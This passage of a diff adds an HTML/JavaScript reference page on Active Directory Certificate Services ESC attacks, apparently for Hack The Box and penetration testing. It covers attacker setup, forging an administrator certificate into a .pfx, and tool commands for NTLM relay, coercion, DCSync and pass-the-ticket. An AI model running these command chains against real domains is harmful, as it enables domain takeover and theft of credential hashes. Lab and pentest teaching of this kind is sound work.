@@ -1,0 +1,935 @@
+
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+--dk-bg:#0d1117;--dk-surface:#161b22;--dk-card:#1c2230;--dk-card2:#21293a;
+--dk-border:#2a3445;--dk-border2:#3a4558;
+--dk-txt:#e6edf3;--dk-txt2:#8b949e;--dk-txt3:#6e7681;
+--dk-red:#ff6b6b;--dk-red-bg:rgba(255,107,107,0.12);--dk-red-border:rgba(255,107,107,0.25);
+--dk-amber:#ffa657;--dk-amber-bg:rgba(255,166,87,0.12);--dk-amber-border:rgba(255,166,87,0.25);
+--dk-blue:#79c0ff;--dk-blue-bg:rgba(121,192,255,0.1);--dk-blue-border:rgba(121,192,255,0.22);
+--dk-green:#7ee787;--dk-green-bg:rgba(126,231,135,0.1);--dk-green-border:rgba(126,231,135,0.22);
+--dk-purple:#d2a8ff;--dk-purple-bg:rgba(210,168,255,0.1);--dk-purple-border:rgba(210,168,255,0.22);
+--dk-teal:#76e3ea;--dk-teal-bg:rgba(118,227,234,0.1);--dk-teal-border:rgba(118,227,234,0.22);
+}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:var(--dk-bg);color:var(--dk-txt);font-size:13.5px;line-height:1.7}
+h2.sr-only{position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0,0,0,0)}
+.shell{display:flex;min-height:740px;border:1px solid var(--dk-border);border-radius:12px;overflow:hidden;background:var(--dk-bg)}
+.sidebar{width:226px;min-width:226px;background:var(--dk-surface);border-right:1px solid var(--dk-border);display:flex;flex-direction:column;overflow-y:auto}
+.sidebar-header{padding:14px 14px 10px;border-bottom:1px solid var(--dk-border)}
+.sidebar-header h1{font-size:12px;font-weight:600;color:var(--dk-txt2);letter-spacing:.06em;text-transform:uppercase}
+.sidebar-header p{font-size:11px;color:var(--dk-txt3);margin-top:2px}
+.nav-section{padding:6px 0}
+.nav-label{font-size:10px;font-weight:600;color:var(--dk-txt3);letter-spacing:.1em;text-transform:uppercase;padding:8px 14px 3px}
+.nav-item{display:flex;align-items:center;gap:8px;padding:6px 14px;cursor:pointer;font-size:12.5px;color:var(--dk-txt2);border:none;background:none;width:100%;text-align:left;transition:background .12s,color .12s}
+.nav-item:hover{background:rgba(255,255,255,0.05);color:var(--dk-txt)}
+.nav-item.active{background:var(--dk-red-bg);color:var(--dk-red)}
+.nav-item .badge{margin-left:auto;font-size:9px;background:var(--dk-red-bg);color:var(--dk-red);border:1px solid var(--dk-red-border);border-radius:10px;padding:1px 5px;font-weight:600}
+.nav-item.active .badge{background:var(--dk-red);color:#0d1117}
+.sev-dot{width:7px;height:7px;border-radius:50%;flex-shrink:0}
+.sev-critical{background:var(--dk-red)}
+.sev-high{background:var(--dk-amber)}
+.sev-medium{background:var(--dk-blue)}
+.main{flex:1;overflow-y:auto;display:flex;flex-direction:column;background:var(--dk-bg)}
+.top-bar{padding:13px 20px;border-bottom:1px solid var(--dk-border);display:flex;align-items:center;justify-content:space-between;background:var(--dk-surface);flex-shrink:0}
+.top-bar h2{font-size:15px;font-weight:500;color:var(--dk-txt)}
+.sev-pill{font-size:10px;font-weight:600;padding:3px 10px;border-radius:20px;border:1px solid;letter-spacing:.04em}
+.sev-pill.critical{background:var(--dk-red-bg);color:var(--dk-red);border-color:var(--dk-red-border)}
+.sev-pill.high{background:var(--dk-amber-bg);color:var(--dk-amber);border-color:var(--dk-amber-border)}
+.sev-pill.medium{background:var(--dk-blue-bg);color:var(--dk-blue);border-color:var(--dk-blue-border)}
+.content{padding:18px 20px;flex:1}
+.section{margin-bottom:20px}
+.section-title{font-size:10px;font-weight:600;color:var(--dk-txt3);text-transform:uppercase;letter-spacing:.1em;margin-bottom:8px;display:flex;align-items:center;gap:6px}
+.section-title i{font-size:13px}
+.card{background:var(--dk-card);border:1px solid var(--dk-border);border-radius:10px;padding:13px 15px;margin-bottom:8px}
+.card p{font-size:13px;line-height:1.75;color:var(--dk-txt)}
+.card p+p{margin-top:8px}
+.tag-row{display:flex;flex-wrap:wrap;gap:5px;margin-bottom:12px}
+.tag{font-size:11px;padding:2px 8px;border-radius:5px;border:1px solid var(--dk-border2);color:var(--dk-txt2);background:var(--dk-card2)}
+.tag.red{background:var(--dk-red-bg);color:var(--dk-red);border-color:var(--dk-red-border)}
+.tag.blue{background:var(--dk-blue-bg);color:var(--dk-blue);border-color:var(--dk-blue-border)}
+.tag.green{background:var(--dk-green-bg);color:var(--dk-green);border-color:var(--dk-green-border)}
+.tag.amber{background:var(--dk-amber-bg);color:var(--dk-amber);border-color:var(--dk-amber-border)}
+.tag.purple{background:var(--dk-purple-bg);color:var(--dk-purple);border-color:var(--dk-purple-border)}
+.code-block{background:#0d1117;border:1px solid var(--dk-border);border-radius:8px;padding:12px 14px;font-family:'Cascadia Code','Fira Code','JetBrains Mono',monospace;font-size:12px;line-height:1.9;color:#e6edf3;overflow-x:auto;margin:6px 0;white-space:pre}
+.cc{color:#6e7681}
+.cd{color:#79c0ff}
+.cf{color:#ffa657}
+.cv{color:#7ee787}
+.cr{color:#ff6b6b}
+.cp{color:#d2a8ff}
+.inline-code{font-family:'Cascadia Code','Fira Code',monospace;font-size:11.5px;background:#161b22;border:1px solid var(--dk-border2);border-radius:4px;padding:1px 5px;color:#79c0ff}
+.warn-box{background:var(--dk-amber-bg);border:1px solid var(--dk-amber-border);border-radius:8px;padding:10px 14px;font-size:12.5px;color:var(--dk-amber);display:flex;gap:8px;align-items:flex-start;margin-bottom:10px}
+.danger-box{background:var(--dk-red-bg);border:1px solid var(--dk-red-border);border-radius:8px;padding:10px 14px;font-size:12.5px;color:var(--dk-red);display:flex;gap:8px;align-items:flex-start;margin-bottom:10px}
+.info-box{background:var(--dk-blue-bg);border:1px solid var(--dk-blue-border);border-radius:8px;padding:10px 14px;font-size:12.5px;color:var(--dk-blue);display:flex;gap:8px;align-items:flex-start;margin-bottom:10px}
+.success-box{background:var(--dk-green-bg);border:1px solid var(--dk-green-border);border-radius:8px;padding:10px 14px;font-size:12.5px;color:var(--dk-green);display:flex;gap:8px;align-items:flex-start;margin-bottom:10px}
+.step-list{list-style:none}
+.step-list li{display:flex;gap:10px;padding:8px 0;border-bottom:1px solid var(--dk-border);font-size:13px;line-height:1.65}
+.step-list li:last-child{border-bottom:none}
+.step-num{width:22px;height:22px;border-radius:50%;background:var(--dk-red-bg);color:var(--dk-red);border:1px solid var(--dk-red-border);font-size:11px;font-weight:600;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:2px}
+.fix-item{display:flex;gap:10px;padding:7px 0;font-size:13px;line-height:1.65;border-bottom:1px solid var(--dk-border)}
+.fix-item:last-child{border-bottom:none}
+.fix-icon{color:var(--dk-green);font-size:15px;flex-shrink:0;margin-top:2px}
+.overview-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:18px}
+.metric-card{background:var(--dk-card);border:1px solid var(--dk-border);border-radius:10px;padding:12px 14px}
+.metric-card .num{font-size:24px;font-weight:500;margin-bottom:2px}
+.metric-card .lbl{font-size:11px;color:var(--dk-txt2)}
+.metric-card.red .num{color:var(--dk-red)}
+.metric-card.amber .num{color:var(--dk-amber)}
+.metric-card.blue .num{color:var(--dk-blue)}
+.esc-grid{display:grid;grid-template-columns:1fr 1fr;gap:7px}
+.esc-card{background:var(--dk-card);border:1px solid var(--dk-border);border-left:3px solid transparent;border-radius:10px;padding:11px 13px;cursor:pointer;transition:all .12s}
+.esc-card:hover{background:var(--dk-card2);border-color:var(--dk-border2)}
+.esc-card.critical{border-left-color:var(--dk-red)}
+.esc-card.high{border-left-color:var(--dk-amber)}
+.esc-card.medium{border-left-color:var(--dk-blue)}
+.esc-card .esc-id{font-size:11px;font-weight:600;color:var(--dk-txt3)}
+.esc-card .esc-name{font-size:12.5px;font-weight:500;margin:2px 0 4px;color:var(--dk-txt)}
+.esc-card .esc-desc{font-size:12px;color:var(--dk-txt2);line-height:1.5}
+.flow-step{display:flex;gap:12px;margin-bottom:0}
+.flow-step-num{width:28px;height:28px;border-radius:50%;font-size:12px;font-weight:600;display:flex;align-items:center;justify-content:center;flex-shrink:0;border:1px solid}
+.flow-step-num.red{background:var(--dk-red-bg);color:var(--dk-red);border-color:var(--dk-red-border)}
+.flow-step-num.amber{background:var(--dk-amber-bg);color:var(--dk-amber);border-color:var(--dk-amber-border)}
+.flow-step-num.blue{background:var(--dk-blue-bg);color:var(--dk-blue);border-color:var(--dk-blue-border)}
+.flow-step-num.green{background:var(--dk-green-bg);color:var(--dk-green);border-color:var(--dk-green-border)}
+.flow-step-body{flex:1;padding:4px 0 14px}
+.flow-step-body h4{font-size:13px;font-weight:500;color:var(--dk-txt);margin-bottom:3px}
+.flow-step-body p{font-size:12.5px;color:var(--dk-txt2);line-height:1.65}
+.flow-connector{width:1px;background:var(--dk-border2);margin:0 13px 0 13px;height:10px;display:block}
+.output-box{background:#0a0f18;border:1px solid var(--dk-border);border-left:3px solid var(--dk-teal);border-radius:8px;padding:11px 14px;font-family:'Cascadia Code','Fira Code',monospace;font-size:11.5px;line-height:1.8;color:#8b949e;margin:6px 0}
+.output-label{font-size:10px;font-weight:600;color:var(--dk-teal);letter-spacing:.08em;text-transform:uppercase;margin-bottom:5px}
+.output-highlight{color:var(--dk-green)}
+.output-warn{color:var(--dk-red)}
+.output-key{color:var(--dk-amber)}
+</style>
+
+<h2 class="sr-only">Active Directory ADCS ESC reference — dark mode edition with workflow, PFX explanation, tool comparison, and pentest logging guide</h2>
+
+<div class="shell">
+<div class="sidebar">
+  <div class="sidebar-header">
+    <h1>ADCS ESC Ref</h1>
+    <p>HTB &amp; pentest edition</p>
+  </div>
+  <div class="nav-section">
+    <div class="nav-label">Start here</div>
+    <button class="nav-item active" onclick="show('overview')"><i class="ti ti-layout-dashboard" aria-hidden="true"></i>Dashboard</button>
+    <button class="nav-item" onclick="show('prereqs')"><i class="ti ti-user-check" aria-hidden="true"></i>Prerequisites &amp; setup</button>
+    <button class="nav-item" onclick="show('pfx')"><i class="ti ti-certificate" aria-hidden="true"></i>What is a .pfx file?</button>
+    <button class="nav-item" onclick="show('certipy_only')"><i class="ti ti-tool" aria-hidden="true"></i>Certipy vs other tools</button>
+    <button class="nav-item" onclick="show('flow')"><i class="ti ti-git-branch" aria-hidden="true"></i>Attack flow overview</button>
+  </div>
+  <div class="nav-section">
+    <div class="nav-label">Critical ESCs</div>
+    <button class="nav-item" onclick="showEsc('esc1')"><span class="sev-dot sev-critical"></span>ESC1 — SAN abuse<span class="badge">CRIT</span></button>
+    <button class="nav-item" onclick="showEsc('esc2')"><span class="sev-dot sev-critical"></span>ESC2 — Any purpose<span class="badge">CRIT</span></button>
+    <button class="nav-item" onclick="showEsc('esc3')"><span class="sev-dot sev-critical"></span>ESC3 — Enroll agent<span class="badge">CRIT</span></button>
+    <button class="nav-item" onclick="showEsc('esc4')"><span class="sev-dot sev-critical"></span>ESC4 — Template write<span class="badge">CRIT</span></button>
+    <button class="nav-item" onclick="showEsc('esc6')"><span class="sev-dot sev-critical"></span>ESC6 — EDITF flag<span class="badge">CRIT</span></button>
+    <button class="nav-item" onclick="showEsc('esc7')"><span class="sev-dot sev-critical"></span>ESC7 — CA officer<span class="badge">CRIT</span></button>
+    <button class="nav-item" onclick="showEsc('esc8')"><span class="sev-dot sev-critical"></span>ESC8 — NTLM relay<span class="badge">CRIT</span></button>
+    <button class="nav-item" onclick="showEsc('esc13')"><span class="sev-dot sev-critical"></span>ESC13 — OID group<span class="badge">CRIT</span></button>
+  </div>
+  <div class="nav-section">
+    <div class="nav-label">High / Medium</div>
+    <button class="nav-item" onclick="showEsc('esc5')"><span class="sev-dot sev-high"></span>ESC5 — PKI obj ACLs</button>
+    <button class="nav-item" onclick="showEsc('esc9')"><span class="sev-dot sev-high"></span>ESC9 — No security ext</button>
+    <button class="nav-item" onclick="showEsc('esc10')"><span class="sev-dot sev-high"></span>ESC10 — Weak mapping</button>
+    <button class="nav-item" onclick="showEsc('esc11')"><span class="sev-dot sev-high"></span>ESC11 — RPC relay</button>
+    <button class="nav-item" onclick="showEsc('esc15')"><span class="sev-dot sev-high"></span>ESC15 — Schema v1</button>
+    <button class="nav-item" onclick="showEsc('esc12')"><span class="sev-dot sev-medium"></span>ESC12 — CSP / HSM</button>
+  </div>
+  <div class="nav-section">
+    <div class="nav-label">Tools &amp; ops</div>
+    <button class="nav-item" onclick="show('tools')"><i class="ti ti-terminal-2" aria-hidden="true"></i>Tool reference</button>
+    <button class="nav-item" onclick="show('detect')"><i class="ti ti-shield-check" aria-hidden="true"></i>Detection &amp; defense</button>
+    <button class="nav-item" onclick="show('logging')"><i class="ti ti-notebook" aria-hidden="true"></i>Logging &amp; reporting</button>
+  </div>
+</div>
+
+<div class="main">
+  <div class="top-bar">
+    <h2 id="page-title">ADCS ESC vulnerability dashboard</h2>
+    <span class="sev-pill critical" id="page-sev" style="display:none"></span>
+  </div>
+  <div class="content" id="main-content"></div>
+</div>
+</div>
+
+<script>
+const D = {};
+
+D.overview = () => `<div>
+<div class="overview-grid">
+  <div class="metric-card red"><div class="num">8</div><div class="lbl">Critical ESCs</div></div>
+  <div class="metric-card amber"><div class="num">5</div><div class="lbl">High severity</div></div>
+  <div class="metric-card blue"><div class="num">1</div><div class="lbl">Medium severity</div></div>
+</div>
+<div class="info-box"><i class="ti ti-bulb" aria-hidden="true" style="font-size:15px;flex-shrink:0;margin-top:1px"></i><div>Start with <span class="inline-code">certipy find -vulnerable</span> on every engagement. Then read the Prerequisites and "What is a .pfx?" pages before diving into individual ESCs.</div></div>
+<div class="section-title"><i class="ti ti-shield-exclamation" aria-hidden="true"></i>All ESC vulnerabilities — click any to open</div>
+<div class="esc-grid">
+${[
+  ['esc1','ESC1','SAN abuse','critical','Enrollee-supplied SAN lets any user impersonate any other including DA'],
+  ['esc2','ESC2','Any purpose EKU','critical','Certificate valid for any purpose — chain to ESC1 or ESC3'],
+  ['esc3','ESC3','Enrollment agent','critical','Two-template chain: get EA cert, then enroll on behalf of DA'],
+  ['esc4','ESC4','Template write perms','critical','Modify any template to introduce ESC1/ESC2 then exploit'],
+  ['esc6','ESC6','EDITF_ATTRIBUTESUBJECTALTNAME2','critical','CA-wide flag: every template becomes ESC1-vulnerable'],
+  ['esc7','ESC7','CA officer rights','critical','ManageCA → grant self Officer → approve/forge certs for any user'],
+  ['esc8','ESC8','NTLM relay HTTP','critical','Relay coerced DC auth to certsrv → get DC cert → DCSync'],
+  ['esc13','ESC13','OID group link','critical','Template OID linked to privileged group — cert = DA membership'],
+  ['esc5','ESC5','PKI object ACLs','high','Write to NTAuthCertificates or CA object = domain-wide trust abuse'],
+  ['esc9','ESC9','No security extension','high','UPN collision attack via userPrincipalName modification'],
+  ['esc10','ESC10','Weak cert mapping','high','Registry keys allow SAN/UPN-based auth bypass'],
+  ['esc11','ESC11','RPC relay','high','Same as ESC8 but targets RPC/DCOM endpoint — survives ESC8 mitigations'],
+  ['esc15','ESC15','Schema v1 EKU bypass','high','Schema v1 templates accept requester-supplied Application Policies'],
+  ['esc12','ESC12','CSP/HSM key exposure','medium','CA private key accessible on host → offline cert forging']
+].map(([k,id,name,sev,desc])=>`<div class="esc-card ${sev}" onclick="showEsc('${k}')"><div class="esc-id">${id}</div><div class="esc-name">${name}</div><div class="esc-desc">${desc}</div></div>`).join('')}
+</div></div>`;
+
+D.prereqs = () => `<div>
+<div class="section-title"><i class="ti ti-user-check" aria-hidden="true"></i>What you need before any ADCS attack</div>
+<div class="info-box"><i class="ti ti-info-circle" aria-hidden="true" style="font-size:15px;flex-shrink:0;margin-top:1px"></i><div>Yes — you need a low-privileged domain user account at minimum. That is the starting condition for every ESC. Without domain credentials, you cannot enumerate templates or enroll in certificates.</div></div>
+<div class="card">
+<p><strong style="font-weight:500;color:#e6edf3">Minimum required: one valid domain user account</strong><br>This could be a regular employee account, a service account with a weak password, or one obtained through phishing, password spraying, AS-REP roasting, or any other initial access method. The account doesn't need any special rights — in most ESCs, Domain Users or Authenticated Users group membership is enough to enumerate and exploit.</p>
+</div>
+<div class="section-title" style="margin-top:16px"><i class="ti ti-server" aria-hidden="true"></i>Network requirements</div>
+<div class="card">
+<div class="step-list">
+<li><span class="step-num" style="background:rgba(121,192,255,0.1);color:#79c0ff;border-color:rgba(121,192,255,0.25)">1</span><div><strong style="font-weight:500;color:#e6edf3">Network reach to the DC</strong> — Certipy talks LDAP (port 389/636) and Kerberos (port 88) to the Domain Controller. Your attacker machine must be able to reach the DC's IP. On HTB, this is usually <span class="inline-code">tun0</span> (VPN interface) to the target IP.</div></li>
+<li><span class="step-num" style="background:rgba(121,192,255,0.1);color:#79c0ff;border-color:rgba(121,192,255,0.25)">2</span><div><strong style="font-weight:500;color:#e6edf3">Network reach to the CA</strong> — Certipy talks to the Certificate Authority via its RPC/DCOM interface (port 135 + dynamic high ports) or the Web Enrollment endpoint (port 80/443). The CA is often a different machine than the DC — check with <span class="inline-code">certipy find</span> output to get its IP.</div></li>
+<li><span class="step-num" style="background:rgba(121,192,255,0.1);color:#79c0ff;border-color:rgba(121,192,255,0.25)">3</span><div><strong style="font-weight:500;color:#e6edf3">DNS resolution (helpful)</strong> — Some tools work better when you can resolve hostnames. Add the DC as your DNS server: <span class="inline-code">echo "nameserver DC-IP" | sudo tee /etc/resolv.conf</span> or pass <span class="inline-code">-dc-ip</span> and <span class="inline-code">-ca</span> flags explicitly to bypass DNS.</div></li>
+</ul>
+</div>
+<div class="section-title" style="margin-top:16px"><i class="ti ti-brand-python" aria-hidden="true"></i>Attacker machine setup</div>
+<div class="code-block"><span class="cc"># Install Certipy (Kali / ParrotOS / Ubuntu)</span>
+<span class="cd">pip3</span> install certipy-ad
+
+<span class="cc"># Verify install</span>
+<span class="cd">certipy</span> --version
+
+<span class="cc"># Install Impacket suite (for relay attacks, secretsdump)</span>
+<span class="cd">pip3</span> install impacket
+
+<span class="cc"># Install Coercer (for coercion attacks ESC8/ESC11)</span>
+<span class="cd">pip3</span> install coercer
+
+<span class="cc"># Optional: set DC as DNS resolver on your tun0 interface</span>
+<span class="cd">sudo</span> resolvectl dns tun0 <span class="cv">10.10.10.5</span></div>
+<div class="section-title" style="margin-top:16px"><i class="ti ti-clock" aria-hidden="true"></i>Time sync — critical for Kerberos</div>
+<div class="warn-box"><i class="ti ti-alert-triangle" aria-hidden="true" style="font-size:15px;flex-shrink:0;margin-top:1px"></i><div>Kerberos authentication (used by <span class="inline-code">certipy auth</span>) requires your system clock to be within 5 minutes of the DC. On HTB machines, always sync time first or you'll get "Clock skew too great" errors.</div></div>
+<div class="code-block"><span class="cc"># Sync to DC time (requires ntpdate or rdate)</span>
+<span class="cd">sudo ntpdate</span> <span class="cv">DC-IP</span>
+<span class="cc"># OR</span>
+<span class="cd">sudo rdate</span> <span class="cf">-n</span> <span class="cv">DC-IP</span>
+<span class="cc"># OR</span>
+<span class="cd">sudo timedatectl</span> set-ntp false
+<span class="cd">sudo date</span> <span class="cf">-s</span> <span class="cv">"$(curl -s --head http://DC-IP | grep Date | cut -d' ' -f3-6)"</span></div>
+</div>`;
+
+D.pfx = () => `<div>
+<div class="section-title"><i class="ti ti-certificate" aria-hidden="true"></i>What is a .pfx file and why does it exist?</div>
+<div class="card">
+<p><strong style="font-weight:500;color:#e6edf3">A .pfx (or .p12) file is a certificate + private key bundle.</strong> Think of it as a password-protected container that holds two things together: the digital certificate (the public claim that says "I am Administrator") and the private key (the secret proof that you actually own that certificate).</p>
+<p>When the CA issues a certificate in response to your request, it signs the certificate — but your private key was generated on your machine when you created the Certificate Signing Request (CSR). The CA never sees your private key. Certipy bundles the CA-signed certificate with your private key into a .pfx file so you have one file to carry around for authentication.</p>
+</div>
+<div class="section-title" style="margin-top:16px"><i class="ti ti-git-branch" aria-hidden="true"></i>How the .pfx comes to exist — full flow</div>
+<div class="card">
+<div class="flow-step">
+  <div class="flow-step-num blue">1</div>
+  <div class="flow-step-body"><h4>Key pair generation</h4><p>Certipy generates an RSA key pair on your attacker machine. Private key stays local. Public key goes into the CSR. This happens automatically when you run <span class="inline-code">certipy req</span> — you never do this manually.</p></div>
+</div>
+<div class="flow-step">
+  <div class="flow-step-num blue">2</div>
+  <div class="flow-step-body"><h4>CSR creation</h4><p>Certipy builds a Certificate Signing Request containing your public key, the template name, and — in ESC1 — the UPN/SAN you're claiming (<span class="inline-code">administrator@corp.local</span>). The CSR is signed with your private key to prove you own it.</p></div>
+</div>
+<div class="flow-step">
+  <div class="flow-step-num amber">3</div>
+  <div class="flow-step-body"><h4>CSR submitted to CA</h4><p>Certipy sends the CSR over the network to the CA (via RPC or HTTP). The CA checks: Is this template enabled? Does the requester have enrollment rights? In ESC1, it does NOT check whether the UPN in the SAN matches the requester's actual identity — that's the vulnerability.</p></div>
+</div>
+<div class="flow-step">
+  <div class="flow-step-num amber">4</div>
+  <div class="flow-step-body"><h4>CA signs and issues the certificate</h4><p>The CA takes your public key from the CSR, stamps it with the identity you claimed (administrator@corp.local), sets the validity period, applies the template's EKU, and signs the whole thing with the CA's own private key. This signed certificate is what the CA returns.</p></div>
+</div>
+<div class="flow-step">
+  <div class="flow-step-num green">5</div>
+  <div class="flow-step-body"><h4>Certipy bundles the .pfx</h4><p>Certipy receives the CA-signed certificate and bundles it with the private key it generated in step 1. The result is <span class="inline-code">administrator.pfx</span> — saved in your current directory. The .pfx may be password-protected (Certipy usually leaves it empty or uses a simple password).</p></div>
+</div>
+<div class="flow-step">
+  <div class="flow-step-num green">6</div>
+  <div class="flow-step-body"><h4>Authentication with the .pfx</h4><p>Now you run <span class="inline-code">certipy auth -pfx administrator.pfx</span>. Certipy extracts the cert and private key, performs PKINIT (certificate-based Kerberos pre-authentication) against the DC, and receives a TGT for <span class="inline-code">administrator</span>. As a bonus, Certipy also dumps the NTLM hash of administrator.</p></div>
+</div>
+</div>
+<div class="section-title" style="margin-top:16px"><i class="ti ti-transform" aria-hidden="true"></i>PFX format conversions you'll sometimes need</div>
+<div class="code-block"><span class="cc"># View cert contents of a .pfx</span>
+<span class="cd">openssl</span> pkcs12 <span class="cf">-in</span> <span class="cv">administrator.pfx</span> <span class="cf">-nokeys</span> <span class="cf">-nodes</span> | openssl x509 <span class="cf">-text</span> <span class="cf">-noout</span>
+
+<span class="cc"># Extract cert and key separately (PEM format)</span>
+<span class="cd">openssl</span> pkcs12 <span class="cf">-in</span> <span class="cv">administrator.pfx</span> <span class="cf">-out</span> <span class="cv">admin_cert.pem</span> <span class="cf">-nodes</span>
+
+<span class="cc"># Convert PEM back to PFX (if Certify.exe gave you PEM)</span>
+<span class="cd">openssl</span> pkcs12 <span class="cf">-export</span> <span class="cf">-in</span> <span class="cv">cert.pem</span> <span class="cf">-out</span> <span class="cv">admin.pfx</span> <span class="cf">-passout</span> <span class="cv">pass:</span>
+
+<span class="cc"># If certipy auth fails: try specifying the username explicitly</span>
+<span class="cd">certipy</span> auth <span class="cf">-pfx</span> <span class="cv">administrator.pfx</span> <span class="cf">-username</span> <span class="cv">administrator</span> <span class="cf">-domain</span> <span class="cv">corp.local</span> <span class="cf">-dc-ip</span> <span class="cv">10.10.10.5</span></div>
+</div>`;
+
+D.certipy_only = () => `<div>
+<div class="section-title"><i class="ti ti-tool" aria-hidden="true"></i>Can you use Certipy alone? When do you need other tools?</div>
+<div class="success-box"><i class="ti ti-circle-check" aria-hidden="true" style="font-size:15px;flex-shrink:0;margin-top:1px"></i><div><strong style="font-weight:500">For most ESC attacks from Linux, Certipy alone is sufficient.</strong> It handles enumeration, certificate requests, CA interaction, NTLM relay (ESC8/ESC11), authentication, LDAP shell, and even template modification — all in one tool.</div></div>
+<div class="card">
+<p><strong style="font-weight:500;color:#e6edf3">What Certipy does by itself:</strong></p>
+<div class="step-list">
+<li><span class="step-num" style="background:rgba(126,231,135,0.1);color:#7ee787;border-color:rgba(126,231,135,0.22)"><i class="ti ti-check" style="font-size:11px" aria-hidden="true"></i></span><div>Enumerate all CA servers, templates, ACLs, flags (<span class="inline-code">certipy find</span>)</div></li>
+<li><span class="step-num" style="background:rgba(126,231,135,0.1);color:#7ee787;border-color:rgba(126,231,135,0.22)"><i class="ti ti-check" style="font-size:11px" aria-hidden="true"></i></span><div>Request certificates for ESC1, ESC2, ESC3, ESC4, ESC6, ESC9, ESC15 (<span class="inline-code">certipy req</span>)</div></li>
+<li><span class="step-num" style="background:rgba(126,231,135,0.1);color:#7ee787;border-color:rgba(126,231,135,0.22)"><i class="ti ti-check" style="font-size:11px" aria-hidden="true"></i></span><div>Authenticate using .pfx → get TGT + NTLM hash (<span class="inline-code">certipy auth</span>)</div></li>
+<li><span class="step-num" style="background:rgba(126,231,135,0.1);color:#7ee787;border-color:rgba(126,231,135,0.22)"><i class="ti ti-check" style="font-size:11px" aria-hidden="true"></i></span><div>CA management: add officers, enable templates, issue requests — ESC7 (<span class="inline-code">certipy ca</span>)</div></li>
+<li><span class="step-num" style="background:rgba(126,231,135,0.1);color:#7ee787;border-color:rgba(126,231,135,0.22)"><i class="ti ti-check" style="font-size:11px" aria-hidden="true"></i></span><div>Modify template attributes — ESC4 (<span class="inline-code">certipy template</span>)</div></li>
+<li><span class="step-num" style="background:rgba(126,231,135,0.1);color:#7ee787;border-color:rgba(126,231,135,0.22)"><i class="ti ti-check" style="font-size:11px" aria-hidden="true"></i></span><div>NTLM relay listener for ESC8/ESC11 (<span class="inline-code">certipy relay</span>)</div></li>
+<li><span class="step-num" style="background:rgba(126,231,135,0.1);color:#7ee787;border-color:rgba(126,231,135,0.22)"><i class="ti ti-check" style="font-size:11px" aria-hidden="true"></i></span><div>Interactive LDAP shell with the obtained TGT (<span class="inline-code">certipy auth -ldap-shell</span>)</div></li>
+<li><span class="step-num" style="background:rgba(126,231,135,0.1);color:#7ee787;border-color:rgba(126,231,135,0.22)"><i class="ti ti-check" style="font-size:11px" aria-hidden="true"></i></span><div>Export BloodHound-compatible JSON (<span class="inline-code">certipy find -bloodhound</span>)</div></li>
+</ul>
+</div>
+<div class="section-title" style="margin-top:16px"><i class="ti ti-alert-triangle" aria-hidden="true"></i>When Certipy is not enough — you do need other tools</div>
+<div class="card">
+<div class="fix-item"><i class="ti ti-x fix-icon" style="color:var(--dk-red)" aria-hidden="true"></i><div><strong style="font-weight:500;color:#e6edf3">ESC8 coercion</strong> — Certipy includes the relay listener but does NOT coerce authentication. You still need <span class="inline-code">PetitPotam.py</span>, <span class="inline-code">Coercer</span>, or <span class="inline-code">dementor.py</span> (PrinterBug) running simultaneously to force the victim machine to authenticate.</div></div>
+<div class="fix-item"><i class="ti ti-x fix-icon" style="color:var(--dk-red)" aria-hidden="true"></i><div><strong style="font-weight:500;color:#e6edf3">DCSync after getting NTLM hash</strong> — Use <span class="inline-code">secretsdump.py</span> from Impacket. Once Certipy gives you the NTLM hash of administrator or DC$, you pass it to secretsdump to dump all domain hashes.</div></div>
+<div class="fix-item"><i class="ti ti-x fix-icon" style="color:var(--dk-red)" aria-hidden="true"></i><div><strong style="font-weight:500;color:#e6edf3">Pass-the-ticket / lateral movement</strong> — Certipy gives you the TGT as a .ccache file. To use it, set <span class="inline-code">export KRB5CCNAME=administrator.ccache</span> then use any Impacket tool with <span class="inline-code">-k -no-pass</span>.</div></div>
+<div class="fix-item"><i class="ti ti-x fix-icon" style="color:var(--dk-red)" aria-hidden="true"></i><div><strong style="font-weight:500;color:#e6edf3">Windows-based exploitation</strong> — If you're on a Windows foothold (beacon/shell), Certipy doesn't run. Use Certify.exe + Rubeus.exe instead. Certify does what <span class="inline-code">certipy find</span> and <span class="inline-code">certipy req</span> do. Rubeus does what <span class="inline-code">certipy auth</span> does.</div></div>
+<div class="fix-item"><i class="ti ti-x fix-icon" style="color:var(--dk-red)" aria-hidden="true"></i><div><strong style="font-weight:500;color:#e6edf3">CA private key extraction (ESC12)</strong> — Use <span class="inline-code">SharpDPAPI</span> or <span class="inline-code">certutil</span> locally on the CA machine, then <span class="inline-code">ForgeCert</span> to forge offline certificates.</div></div>
+</div>
+<div class="section-title" style="margin-top:16px"><i class="ti ti-arrows-right-left" aria-hidden="true"></i>Certipy vs Certify.exe — same job, different platform</div>
+<div class="code-block"><span class="cc">LINUX (attacker Kali)              WINDOWS (compromised host)</span>
+<span class="cc">──────────────────────────────     ────────────────────────────────</span>
+<span class="cv">certipy find -vulnerable</span>      →   <span class="cv">Certify.exe find /vulnerable</span>
+<span class="cv">certipy req -upn admin@...</span>    →   <span class="cv">Certify.exe request /altname:admin</span>
+<span class="cv">certipy auth -pfx admin.pfx</span>   →   <span class="cv">Rubeus.exe asktgt /certificate:...</span>
+<span class="cv">certipy ca -add-officer user</span>  →   <span class="cv">(no direct equiv; use ADCS GUI or certutil)</span>
+<span class="cv">certipy relay</span>                 →   <span class="cv">ntlmrelayx.py (run from Linux)</span>
+<span class="cv">secretsdump.py -hashes :hash</span>  →   <span class="cv">mimikatz lsadump::dcsync /domain:...</span></div>
+</div>`;
+
+D.flow = () => `<div>
+<div class="section-title"><i class="ti ti-git-branch" aria-hidden="true"></i>Full attack flow — from low-priv user to domain admin</div>
+<div class="info-box"><i class="ti ti-info-circle" aria-hidden="true" style="font-size:15px;flex-shrink:0;margin-top:1px"></i><div>This is the canonical ESC1 flow. Other ESCs follow the same shape — only the middle "exploit" step changes.</div></div>
+<div class="card">
+<div class="flow-step"><div class="flow-step-num blue">1</div><div class="flow-step-body"><h4>Initial access — you have a domain user</h4><p>Obtained via phishing, password spray, AS-REP roast, etc. You have: username + password (or NTLM hash). Example: <span class="inline-code">lowpriv:Password123@corp.local</span></p></div></div>
